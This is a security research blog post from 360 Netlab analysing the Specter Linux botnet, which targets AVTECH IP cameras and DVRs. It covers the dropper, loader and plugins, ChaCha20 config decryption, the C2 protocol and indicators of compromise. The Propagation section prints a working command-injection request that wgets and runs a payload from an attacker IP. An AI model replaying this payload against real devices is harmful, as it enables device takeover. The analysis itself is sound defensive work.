<!DOCTYPE html>
<html lang="en">
<head>

    <title>Ghost in action: the Specter botnet</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=42b57cac00" />

    <link rel="icon" href="https://blog.netlab.360.com/content/images/size/w256h256/2019/02/netlab_xs-2.png" type="image/png">
    <link rel="canonical" href="https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/amp/">
    
    <meta property="og:site_name" content="360 Netlab Blog - Network Security Research Lab at 360">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Ghost in action: the Specter botnet">
    <meta property="og:description" content="Background


On August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file (22523419f0404d628d02876e69458fbe.css)with 0 VT detection.


When we took a close look, we see a new botnet that targets AVTECH IP Camera / NVR / DVR devices, and it has flexible configuration, highly modular / plugin, and uses TLS,">
    <meta property="og:url" content="https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/">
    <meta property="og:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta property="article:published_time" content="2020-09-25T13:38:00.000Z">
    <meta property="article:modified_time" content="2020-09-26T11:28:02.000Z">
    <meta property="article:tag" content="Botnet">
    <meta property="article:tag" content="en">
    <meta property="article:tag" content="RAT">
    <meta property="article:tag" content="chacha20">
    <meta property="article:tag" content="Import 2022-11-30 11:16">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Ghost in action: the Specter botnet">
    <meta name="twitter:description" content="Background


On August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file (22523419f0404d628d02876e69458fbe.css)with 0 VT detection.


When we took a close look, we see a new botnet that targets AVTECH IP Camera / NVR / DVR devices, and it has flexible configuration, highly modular / plugin, and uses TLS,">
    <meta name="twitter:url" content="https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/">
    <meta name="twitter:image" content="https://blog.netlab.360.com/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Alex.Turing">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Botnet, en, RAT, chacha20, Import 2022-11-30 11:16">
    <meta name="twitter:site" content="@360Netlab">
    <meta name="twitter:creator" content="@TuringAlex">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "360 Netlab Blog - Network Security Research Lab at 360",
        "url": "https://blog.netlab.360.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "Alex.Turing",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.netlab.360.com/content/images/2019/06/turing.PNG",
            "width": 1200,
            "height": 1200
        },
        "url": "https://blog.netlab.360.com/author/alex/",
        "sameAs": [
            "https://twitter.com/TuringAlex"
        ]
    },
    "headline": "Ghost in action: the Specter botnet",
    "url": "https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/",
    "datePublished": "2020-09-25T13:38:00.000Z",
    "dateModified": "2020-09-26T11:28:02.000Z",
    "keywords": "Botnet, en, RAT, chacha20, Import 2022-11-30 11:16",
    "description": "Background\n\n\nOn August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file (22523419f0404d628d02876e69458fbe.css)with 0 VT detection.\n\n\nWhen we took a close look, we see a new botnet that targets AVTECH IP Camera / NVR / DVR devices, and it has flexible configuration, highly modular / plugin, and uses TLS, ChaCha20, Lz4 to encrypt and compress network traffic.\n\n\nThe ELF we captured is Dropper, it releases a loader, and the loader will send encrypted traffic requests various P",
    "mainEntityOfPage": "https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/"
}
    </script>

    <meta name="generator" content="Ghost 5.76">
    <link rel="alternate" type="application/rss+xml" title="360 Netlab Blog - Network Security Research Lab at 360" href="https://blog.netlab.360.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="db8c743e6bb1457403d255d83f" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://blog.netlab.360.com/" crossorigin="anonymous"></script>
    
    <link href="https://blog.netlab.360.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=42b57cac00"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=42b57cac00">
    <style type='text/css'>
	#ghost-portal-root {
        display: none;
    }
</style><style>:root {--ghost-accent-color: #eca265;}</style>

</head>
<body class="post-template tag-botnet tag-en tag-rat tag-chacha20 tag-import-2022-11-30-11-16 has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <nav class="gh-head-inner inner">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://blog.netlab.360.com">
                        <img src="https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png" alt="360 Netlab Blog - Network Security Research Lab at 360" />
                </a>
                <div class="gh-head-brand-wrapper">
                    <button class="gh-search" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <a class="gh-burger" role="button">
                        <div class="gh-burger-box">
                            <div class="gh-burger-inner"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-botnet"><a href="https://blog.netlab.360.com/tag/botnet/">Botnet</a></li>
    <li class="nav-dnsmon"><a href="https://blog.netlab.360.com/tag/dnsmon/">DNSMon</a></li>
    <li class="nav-ddos"><a href="https://blog.netlab.360.com/tag/ddos/">DDoS</a></li>
    <li class="nav-passivedns"><a href="https://blog.netlab.360.com/tag/pdns/">PassiveDNS</a></li>
    <li class="nav-mirai"><a href="https://blog.netlab.360.com/tag/mirai/">Mirai</a></li>
    <li class="nav-dta"><a href="https://blog.netlab.360.com/tag/dta/">DTA</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                        <a class="gh-social-link gh-social-twitter" href="https://twitter.com/360Netlab" title="Twitter" target="_blank" rel="me noopener"><svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
                        <a class="gh-social-link gh-social-feedly" href="https://feedly.com/i/subscription/feed/https://blog.netlab.360.com/rss/" title="RSS" target="_blank" rel="me noopener"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
</a>
                </div>
            </div>
        </nav>
    </header>

    <div class="site-content">
             <div class="floating-header">
    <div class="floating-header-logo">
        <a href="https://blog.netlab.360.com">
                <img src="/content/images/size/w30/2019/02/netlab_xs-2.png" alt="360 Netlab Blog - Network Security Research Lab at 360 icon" />
            <span>360 Netlab Blog - Network Security Research Lab at 360</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Ghost in action: the Specter botnet</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Ghost%20in%20action%3A%20the%20Specter%20botnet&amp;url=https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.netlab.360.com/ghost-in-action-the-specter-botnet/"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
            <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>        </a>
    </div>
    <progress id="reading-progress" class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


  <main id="site-main" class="site-main">
    <article class="article post tag-botnet tag-en tag-rat tag-chacha20 tag-import-2022-11-30-11-16 no-image ">

      <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
          <span class="post-card-primary-tag">
            <a href="/tag/botnet/">Botnet</a>
          </span>
        </div>

        <h1 class="article-title">Ghost in action: the Specter botnet</h1>


        <div class="article-byline">
          <section class="article-byline-content">

            <ul class="author-list">
              <li class="author-list-item">
                <a href="/author/alex/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
                </a>
              </li>
              <li class="author-list-item">
                <a href="/author/huiwang/" class="author-avatar">
                  <img class="author-profile-image" src="/content/images/2017/05/WechatIMG1.jpeg" alt="Hui Wang" />
                </a>
              </li>
            </ul>

            <div class="article-byline-meta">
              <h4 class="author-name"><a href="/author/alex/">Alex.Turing</a>, <a href="/author/huiwang/">Hui Wang</a></h4>
              <div class="byline-meta-content">
                <time class="byline-meta-date" datetime=" 2020-09-25">Sep 25, 2020</time>
                <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
              </div>
            </div>

          </section>
        </div>


      </header>

      <section class="gh-content gh-canvas">
        <!--kg-card-begin: markdown--><h2 id="background">Background</h2>
<p>On August 20, 2020, 360Netlab Threat Detect System captured a suspicious ELF file (<code>22523419f0404d628d02876e69458fbe.css</code>)with 0 VT detection.</p>
<p>When we took a close look, we see a new botnet that targets <code>AVTECH IP Camera / NVR / DVR devices</code>, and it has flexible configuration, highly modular / plugin, and uses TLS, ChaCha20, Lz4 to encrypt and compress network traffic.</p>
<p>The ELF we captured is Dropper, it releases a loader, and the loader will send encrypted traffic requests various Plugins from C2 to perform different functions. The sample build path is <code>/build/arm-specter-linux-uclibcgnueabi</code>, that is why we named it Specter.</p>
<p>At present, Specter has a lot of <code>unprofessional aspects</code>. For example, it releases two libraries required by runtime while releasing Loader, but they are all dynamically linked.We also noticed  that Plugin does not expand and load directly in memory.<a href="https://www.exploit-db.com/exploits/40500?ref=blog.netlab.360.com">The vulnerability being targeted is also quite old, a 5 years old on</a>. On the other hand, this botnet has a good layered design, complex network communication and some other characteristics，which is obviously a work of professional. <code>Professional aspects come with unprofessional aspects</code>, this contradiction makes us speculate that Specter is in the test development stage. We will see how it goes in the future.</p>
<h2 id="overview">Overview</h2>
<p>Specter is a remote control Trojan (RAT) for the Linux platform.</p>
<p>It consists of 3 parts, Dropper, Loader, and Plugin. The main function is determined by Loader&amp;Plugin. The main functions of Specter are</p>
<ul>
<li>
<p>File management</p>
</li>
<li>
<p>Download and upload management</p>
</li>
<li>
<p>Shell service</p>
</li>
<li>
<p>Socket5 Proxy</p>
</li>
<li>
<p>Report device information</p>
</li>
<li>
<p>Execute the script issued by C2</p>
</li>
<li>
<p>Executing C2 to deliver executable files</p>
</li>
</ul>
<p>The basic process is shown in the figure below:<br>
<a href="https://blog.netlab.360.com/content/images/2020/09/specter_flow.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_flow.PNG" class="kg-image"></a></p>
<h2 id="propagation">Propagation</h2>
<p>Specter spread its Dropper samples through<a href="https://www.exploit-db.com/exploits/40500?ref=blog.netlab.360.com">AVTECH IP Camera / NVR / DVR Devices vulnerabilities</a>,The payload being used is as follows:</p>
<pre><code>GET /cgi-bin/nobody/Search.cgi?action=cgi_query&amp;ip=google.com&amp;port=80&amp;queryb64str=Lw==&amp;username=admin%20;XmlAp%20r%20Account.User1.Username%3E$(wget%20http://45.76.70.163:80/style/351f37b2764041759c859202c529aefc.css%20-O%20/tmp/webstatus;chmod%20755%20/tmp/webstatus;/tmp/webstatus;rm%20-f%20/tmp/webstatus;)&amp;password=admin HTTP/1.1
Host: {}:4443
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.7,zh;q=0.5,zh-TW;q=0.3,zh-HK;q=0.2
Content-Type: text/plain; charset=utf-8
</code></pre>
<h2 id="sampleanalysis">Sample analysis</h2>
<p>Specter's infection process can be divided into 4 stages.，</p>
<ul>
<li>Stage 0: Preliminary stage, spread through vulnerabilities, implant Dropper on the device</li>
<li>Stage 1: Dropper releases Loader</li>
<li>Stage 2: Loading stage, Loader loads Plugin</li>
<li>Stage 3: Plugin executes the instructions issued by C2</li>
</ul>
<h3 id="stage1stage1releasestagespecter_dropperanalysis">Stage1：Stage1: Release stage, Specter_Dropper analysis</h3>
<p>The main function of the dropper is to detect the operating environment, decrypt the Loader, configure the Config, and finally release and start the Loader.</p>
<blockquote>
<p>MD5:a8400c378950084fc8ab80b8bb4e5b18</p>
<p>ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, stripped</p>
<p>Packer:No</p>
</blockquote>
<ul>
<li>
<h4 id="11decryptloader">1.1 Decrypt Loader</h4>
</li>
</ul>
<p>Decryption algorithm:XOR byte by byte <code>0x79</code>, then negate.<br>
<a href="https://blog.netlab.360.com/content/images/2020/09/specter_drop_decode.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_drop_decode.PNG" class="kg-image"></a></p>
<p>Along with the loaders, the runtime library, <code>libc.so.0 and ld-uClibc.so.1</code> are also decrypted.Currently these two libraries have no malicious functions, but we speculate that future versions will hijack some functions of these two libraries to hide the existence of Specter from file, process and networks’ perspectives</p>
<ul>
<li>
<h4 id="12configureconfig">1.2 Configure Config</h4>
</li>
</ul>
<p>Look for the written position mark in the Loader sample <code>SpctCF</code>, and then write Config at its subsequent address.。<br>
<a href="https://blog.netlab.360.com/content/images/2020/09/specter_drop_setconf.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_drop_setconf.PNG" class="kg-image"></a></p>
<p>The comparison is as follows:</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_drop_conf.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_drop_conf.PNG" class="kg-image"></a></p>
<ul>
<li>
<h4 id="13releaseandexecuteloader">1.3 Release and execute Loader</h4>
</li>
</ul>
<p>Release Loader to the<code>/tmp/runtimes/hw_ex_watchdog</code> file and run it, and later on delete itself to clean up the traces of Dropper。</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_drop_run.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_drop_run.PNG" class="kg-image"></a></p>
<h3 id="stage2loadingstagespecter_loaderanalysis">Stage2: Loading stage, Specter_Loader analysis</h3>
<p>The main function of Loader is to decrypt Config, obtain C2 from it, establish encrypted communication with C2, and execute the instructions issued by C2. If there is no Plugin for processing the corresponding instructions, it will request the required Plugin from C2.</p>
<blockquote>
<p>MD5:470a092abd67e25463425b611088b1db</p>
<p>ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared libs), stripped</p>
<p>Packer:No</p>
</blockquote>
<ul>
<li>
<h4 id="21decryptconfig">2.1 Decrypt Config</h4>
</li>
</ul>
<p>There are C2, mutex name, nonce and other information in the Config file, ChaCha20 encryption is used, where the key is <code>CsFg34HbrJsAx6hjBmxDd7A2Wj0Cz9s\x00</code> and the number of rounds is <code>15</code>.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_decode.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_decode.PNG" class="kg-image"></a></p>
<p>The detailed Config structure is shown below:，</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_config.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_config.PNG" class="kg-image"></a></p>
<p>Take the Config in the above figure as an example, the nonce (12 bytes) required for decryption is:</p>
<pre><code>c1 f5 9e 20 7a 35 9d 25 ed 77 bb 70
</code></pre>
<p>The ciphertext is:</p>
<pre><code>94 69 CA D5 A0 0F 73 A9 BB 05 71 B2 31 1D EF 06 
1A 2A BC 94 3A A7 4B 72 3A 0C BC 8E BF 57 1E 69 
88 1B A1 7D FB 79 6C 26 A9 95 EB B1 E9 53 A9 2B 
33 3D A7 F6 D2 07 E4 64 FD 70 81 C2 83 C2 A1 5F 
13 EB 3F 9C 6F CD 03 50 84 C5 5C 9C 31 B1 9F CF 
06 4B 5F 12 E9 C3 39 C3 EE 07 C5 CE E2 C2 58 FA
6C AA 6D 9B 00 C2 37 3E C2 98 52 47 D4 4D E7
</code></pre>
<p>After decryption, we get the following plaintext, we can see that C2 is <code>107.182.186.195</code> and mutex is <code>fb4mi5a</code></p>
<pre><code>00000000  f4 36 ce 57 b0 46 d2 96 27 1c a6 88 fe 57 e2 22  |ô6ÎW°FÒ.'.¦.þWâ&quot;|
00000010  52 34 19 f0 40 4d 62 8d 02 87 6e 69 45 8f be 6a  |R4.ð@Mb...niE.¾j|
00000020  66 62 34 6d 69 35 61 00 01 00 00 00 0f 00 00 00  |fb4mi5a.........|
00000030  31 30 37 2e 31 38 32 2e 31 38 36 2e 31 39 35 03  |107.182.186.195.|
00000040  00 00 00 34 34 33 01 00 00 00 01 00 00 00 01 00  |...443..........|
00000050  00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00  |................|
00000060  00 00 01 00 00 00 1e 00 5a 00 14 00 3c 00 00     |........Z...&lt;..|
</code></pre>
<ul>
<li>
<h4 id="22establishcommunicationwithc2">2.2 Establish communication with C2</h4>
</li>
</ul>
<p>The communication process can be divided into 4 stages, using TLS, ChaCha20 encryption algorithm, lz4 compression algorithm to ensure the security of data communication.The first stage is to establish a TLS connection, the second stage is the process of mutual agreement authentication, the third stage is the Loader reporting device information, and the fourth stage executes the C2 issuing instruction process.</p>
<h6 id="tlscommunication">TLS communication</h6>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_ssl.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_ssl.PNG" class="kg-image"></a></p>
<p>In order to analyze the network traffic, we performed a Man-in-the-middle attack,and can see the result as follows. It can be seen that Specter's network communication packet has a fixed format.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_commhijack.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_commhijack.PNG" class="kg-image"></a></p>
<p>Packets can be divided into four parts, the detailed structure is shown below:，<br>
<a href="https://blog.netlab.360.com/content/images/2020/09/specter_packet_info.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_packet_info.PNG" class="kg-image"></a></p>
<p>Where <code>Encrypted Payload_info</code> stores the payload verification, length, ID and other info.<code>[Encrypted?]Compressed Payload</code> is the payload itself, the payload will only be compressed during the  key exchange stage, while in all the other stages it gets both encrypted and compressed.</p>
<p>Let’s take a look at the above figure, the data packet that Bot sends to C2 for secret key exchange</p>
<p>The encryption algorithm used in the first part(<code>ncrypted Payload_info</code>) is:</p>
<pre><code>ChaCha20
Key:		36 30 30 64 65 33 31 39 61 32 66 38 31 39 62 34 
			61 38 35 31 64 32 33 66 63 34 62 33 33 33 33 65
Nonce:		E7 66 29 FB 10 98 F6 5A 80 80 FF 58	
</code></pre>
<p>The ciphertext is:</p>
<pre><code>0F 41 01 FD 8B 75 6C A2 20 31 DC 35 70 D9 4D 3B 8E 53 4D E9
</code></pre>
<p>after decryption:</p>
<pre><code>C9 3E 00 00 00 00 00 00 00 00 01 00 22 00 00 00 20 00 00 00

3EC9		---- CRC16 of Payload
0001		---- Cmd Id
00000022	Compressed Payload length
00000020	Decomressed Payload length
</code></pre>
<p>The value of <code>Cmd Id</code>  is 1, indicating that it is in the key exchange stage, directly decompress <code>[Encrypted?]Compressed Payload</code> and get the key sent by Bot to C2</p>
<pre><code>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10
11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20
</code></pre>
<h6 id="authentication">Authentication</h6>
<p>The protocol authentication process can be divided into two stages, the first stage is the key exchange, and the second stage is the mutual recognition of identity.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_commfst.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_commfst.PNG" class="kg-image"></a></p>
<p>According to the data packet decryption process introduced above, we will get.</p>
<p>The secret key sent by Bot to C2 is:</p>
<pre><code>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10
11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20
</code></pre>
<p>The secret key sent by C2 to Bot is:</p>
<pre><code>19 F8 7C 62 7B 8D A2 B3 59 FD AE 25 4C 18 F7 33
96 B5 D9 F5 EC FF C2 07 C3 7C 87 53 AE 60 99 2C
</code></pre>
<p>In the secret key exchange phase, the payload is only compressed without encryption; after the secret key is exchanged, Bot and C2 encrypt and compress the payload with each other's secret key.</p>
<p>It can be solved with the above secret key.</p>
<p>The authentication information sent by Bot to C2 is:</p>
<pre><code>00000000:  44 48 6E 37-34 73 64 50-4F 71 6E 53-64 32 35 39  DHn74sdPOqnSd259
</code></pre>
<p>The authentication information sent by C2 to Bot is:</p>
<pre><code>00000000:  6C 30 53 4F-38 68 46 55-78 62 56 73-64 74 51 34  l0SO8hFUxbVsdtQ4
</code></pre>
<p>This is consistent with the implementation we saw in the sample:<br>
<a href="https://blog.netlab.360.com/content/images/2020/09/specter_packet_proof.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_packet_proof.PNG" class="kg-image"></a></p>
<ul>
<li>
<h4 id="23reportdeviceinformationsuchasmacipaddresssystemtypeetc">2.3 Report device information, such as MAC/IP address, system type, etc.</h4>
</li>
</ul>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_device.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_device.PNG" class="kg-image"></a></p>
<ul>
<li>
<h4 id="24executethestartplugincommandissuedbyc2">2.4 Execute the start Plugin command issued by C2</h4>
</li>
</ul>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_cmd.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_cmd.PNG" class="kg-image"></a></p>
<p>Specter implements a very flexible plugin management communication mechanism, each plugin must implement the following 4 methods,</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_loader_syscall.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_loader_syscall.PNG" class="kg-image"></a><br>
If there is no corresponding Plugin currently, a request is made to C2 and finally dynamically loaded into Loader <code>Plugin Slot</code>.</p>
<h3 id="stage3specter_pluginanalysis">Stage3: Specter_Plugin analysis</h3>
<p>When the bot gets the Plugin issued by C2, it cannot be used directly, because they are encrypted and can only be loaded into the Plugin Slot for use after decryption.<br>
Decryption algorithm: XOR <code>0x7f</code> byte by byte, then negate</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_decode.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_decode.PNG" class="kg-image"></a></p>
<p>Here are some plugins we captured:</p>
<h4 id="shellplugin">Shell plugin</h4>
<blockquote>
<p>Plugin id: 1</p>
<p>c7bf33d159597f55dce31b33a58d52de</p>
<p>ELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped</p>
</blockquote>
<p>The main function of Shell plugin is to create SHELL service.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_shell.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_shell.PNG" class="kg-image"></a></p>
<h4 id="fileplugin">File  plugin</h4>
<blockquote>
<p>Plugin id: 2</p>
<p>e67db6449c18b2e552786df7718a33c8</p>
<p>ELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped</p>
</blockquote>
<p>The main function of the File plugin is file management. In addition to supporting read, write, delete, and search operations on file directories, it may also download/upload files from a designated server.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_file.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_file.PNG" class="kg-image"></a></p>
<h4 id="socketplugin">Socket Plugin</h4>
<blockquote>
<p>Plugin id: 3</p>
<p>45c5e7bcb9987356b53fd9a78543dcda</p>
<p>ELF 32-bit LSB shared object, ARM, version 1 (SYSV), not stripped</p>
</blockquote>
<p>The main function of Socket Plugin is to start Socket5 proxy.</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_socket.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_socket.PNG" class="kg-image"></a></p>
<h4 id="ssfplugin">SSF Plugin</h4>
<blockquote>
<p>Plugin id: 5</p>
<p>da0f9a21ae7ee3d15794946ca74a07e3</p>
<p>ELF 32-bit LSB shared object, ARM, version 1 (SYSV), stripped</p>
</blockquote>
<p>The main function of SSF Plugin is to download an executable file from a specified server to a local <code>/tmp/runtimes/httpd_log_output</code> file, and then execute it.。</p>
<p><a href="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_ssf.PNG"><img src="https://blog.netlab.360.com/content/images/2020/09/specter_plugin_ssf.PNG" class="kg-image"></a></p>
<h2 id="suggestions">Suggestions</h2>
<p>We recommend that readers monitor and block Specter related IP, URL and samples.</p>
<h2 id>联系我们</h2>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/360Netlab?ref=blog.netlab.360.com"><strong>twitter</strong></a> , WeChat 360Netlab or email to netlab at 360 dot cn.</p>
<h2 id="ioc">IoC</h2>
<h4 id="cc">CC</h4>
<pre><code>107.182.186.195:443	ASN25820|IT7_Networks_Inc	United_States|California|Los_Angeles
</code></pre>
<h4 id="samplemd5">Sample MD5</h4>
<pre><code>04c7ef9e4197985d31e5d601a9161c5e
052b6fce24a800259289e2f06163db57
065d942effb6010bb48f7403d3ad442b
0d0bf23412bd34c82ab28e67278519bf
2b89fd69d128c8a28425c512670e531a
2ed27722e095b1c870fdb10e4990db0f
42d341d0b76869abc2231c70d0f0ecc9
5e03c99153ed59546bf60c9f896a30f1
7377eedb6512743858d52da3cc028a33
7c59ddc06da158afc8b514a9a81ffd36
a5ded8b31b17c88302882cccc35cc28f
a8400c378950084fc8ab80b8bb4e5b18
a99563e6711990b9b3f542ae146bd01c
acfa5f547b69bde0bf3f343429594b99
b79639e2b5d10f92ea44721e155fc09b
